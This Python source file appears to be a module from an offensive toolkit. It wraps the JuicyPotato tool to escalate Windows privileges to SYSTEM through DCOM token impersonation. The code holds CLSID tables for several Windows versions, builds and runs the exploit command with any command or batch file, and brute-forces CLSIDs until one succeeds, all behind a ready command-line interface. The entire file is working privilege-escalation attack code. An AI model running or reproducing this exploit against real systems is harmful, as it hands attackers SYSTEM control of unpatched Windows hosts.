import os
from typing import Tuple, Optional, List
from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import PotatoExploitBase


class JuicyPotatoExploit(PotatoExploitBase):
    """Exploit using JuicyPotato for privilege escalation."""

    # Common CLSIDs for different Windows versions
    COMMON_CLSIDS = {
        'bits': '{4991d34b-80a1-4291-83b6-3328366b9097}',
        'wuauserv': '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}',
        'schedule': '{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}',
        'dcom_default': '{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}',
        'webclient': '{a6f6a6c9-1a5c-4e74-b66d-d2d69bbc8a5d}'
    }

    # CLSIDs by Windows version
    VERSION_CLSIDS = {
        'Server 2012': '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}',  # wuauserv
        'Server 2016': '{4991d34b-80a1-4291-83b6-3328366b9097}',  # BITS
        'Windows 7': '{03ca98d6-ff5d-49b8-abc6-03dd84127020}',
        'Windows 8': '{5167B42F-C111-47A1-ACC4-8EABE61B0B54}',
        'Windows 10': '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
    }

    def __init__(self, output_dir: str = "token_impersonation"):
        """
        Initialize the JuicyPotato exploit module.

        Args:
            output_dir: Directory for storing output files
        """
        super().__init__("juicypotato", output_dir)
        self.tool_path = "C:\\Windows\\Temp\\JuicyPotato.exe"
        self.log("JuicyPotato exploit module initialized", "SUCCESS")

    def get_requirements(self) -> dict:
        """
        Get the requirements for this exploit.

        Returns:
            Dictionary with requirement information
        """
        return {
            'privilege': 'SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege',
            'max_windows': 'Windows 10 1803 / Server 2016',
            'note': 'PATCHED in Windows 10 1809+ and Server 2019+',
            'tool_url': self.TOOL_URLS['juicypotato'],
            'description': 'BITS-based DCOM impersonation'
        }

    def list_clsids(self) -> None:
        """Print available CLSIDs for different Windows versions."""
        print("\n" + "=" * 60)
        print("AVAILABLE CLSIDs")
        print("=" * 60)

        print("\nCommon CLSIDs:")
        for name, clsid in self.COMMON_CLSIDS.items():
            print(f"    {name}: {clsid}")

        print("\nVersion-specific CLSIDs:")
        for version, clsid in self.VERSION_CLSIDS.items():
            print(f"    {version}: {clsid}")

        print(f"\n[*] Full CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID")

    def exploit(self, command: str = "cmd.exe",
                clsid: str = None,
                listen_port: int = 1337,
                process_type: str = "*") -> Tuple[bool, str]:
        """
        Execute JuicyPotato privilege escalation.

        Args:
            command: Command/program to execute as SYSTEM
            clsid: COM object CLSID (auto-selected if not provided)
            listen_port: Local COM server port
            process_type: Process creation type (* = both)

        Returns:
            Tuple of (success, output)
        """
        self.log(f"Attempting privilege escalation with JuicyPotato...")

        # Default to BITS CLSID
        if not clsid:
            clsid = self.COMMON_CLSIDS['bits']
            self.log(f"Using default CLSID (BITS): {clsid}")
        else:
            self.log(f"Using CLSID: {clsid}")

        self.log(f"Target command: {command}")
        self.log(f"Listen port: {listen_port}")

        # Verify tool exists
        if not self.check_tool_exists():
            return False, f"Tool not found: {self.tool_path}"

        # Build command
        cmd = f'{self.tool_path} -l {listen_port} -p "{command}" -t {process_type} -c {clsid}'

        self.log(f"Executing: {cmd}")

        try:
            result = self.run_command(cmd, timeout=60)

            output = result.stdout + result.stderr

            self.log("Command output:", "INFO")
            for line in output.split('\n'):
                if line.strip():
                    print(f"    {line}")

            # Check for success
            if self.verify_system_privileges(output):
                self.log("SUCCESS! Escalated to SYSTEM", "SUCCESS")
                return True, output
            else:
                self.log("Escalation failed", "WARNING")
                self.log("Try a different CLSID with --list-clsids", "INFO")
                return False, output

        except Exception as e:
            self.log(f"JuicyPotato failed: {e}", "ERROR")
            return False, str(e)

    def exploit_with_batch(self, batch_file: str,
                           clsid: str = None,
                           listen_port: int = 1337) -> Tuple[bool, str]:
        """
        Execute JuicyPotato with a batch file payload.

        Args:
            batch_file: Path to batch file to execute
            clsid: COM object CLSID
            listen_port: Local COM server port

        Returns:
            Tuple of (success, output)
        """
        self.log(f"Using batch file: {batch_file}")

        if not os.path.exists(batch_file):
            self.log(f"Batch file not found: {batch_file}", "ERROR")
            return False, "Batch file not found"

        # Use cmd.exe to run batch
        command = f"cmd.exe /c {batch_file}"

        return self.exploit(
            command=command,
            clsid=clsid,
            listen_port=listen_port
        )

    def brute_force_clsids(self, command: str = "whoami",
                           listen_port: int = 1337) -> Optional[str]:
        """
        Try multiple CLSIDs until one works.

        Args:
            command: Command to execute
            listen_port: Local COM server port

        Returns:
            Working CLSID or None
        """
        self.log("Brute-forcing CLSIDs...")

        all_clsids = list(self.COMMON_CLSIDS.values()) + list(self.VERSION_CLSIDS.values())

        for clsid in all_clsids:
            self.log(f"Trying CLSID: {clsid}")

            success, output = self.exploit(
                command=command,
                clsid=clsid,
                listen_port=listen_port
            )

            if success:
                self.log(f"Working CLSID found: {clsid}", "SUCCESS")
                return clsid

            # Increment port in case it's in use
            listen_port += 1

        self.log("No working CLSID found", "ERROR")
        return None


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="JuicyPotato Exploit")
    parser.add_argument('--command', '-c', default='whoami',
                        help='Command to execute as SYSTEM')
    parser.add_argument('--clsid', help='CLSID to use')
    parser.add_argument('--port', '-p', type=int, default=1337,
                        help='Local COM server port')
    parser.add_argument('--tool-path', '-t',
                        help='Path to JuicyPotato.exe')
    parser.add_argument('--list-clsids', action='store_true',
                        help='List available CLSIDs')
    parser.add_argument('--brute', action='store_true',
                        help='Brute force CLSIDs')

    args = parser.parse_args()

    exploit = JuicyPotatoExploit()

    if args.tool_path:
        exploit.set_tool_path(args.tool_path)

    if args.list_clsids:
        exploit.list_clsids()
    elif args.brute:
        exploit.brute_force_clsids(args.command, args.port)
    else:
        success, output = exploit.exploit(
            command=args.command,
            clsid=args.clsid,
            listen_port=args.port
        )
        print(f"\n[{'SUCCESS' if success else 'FAILED'}]")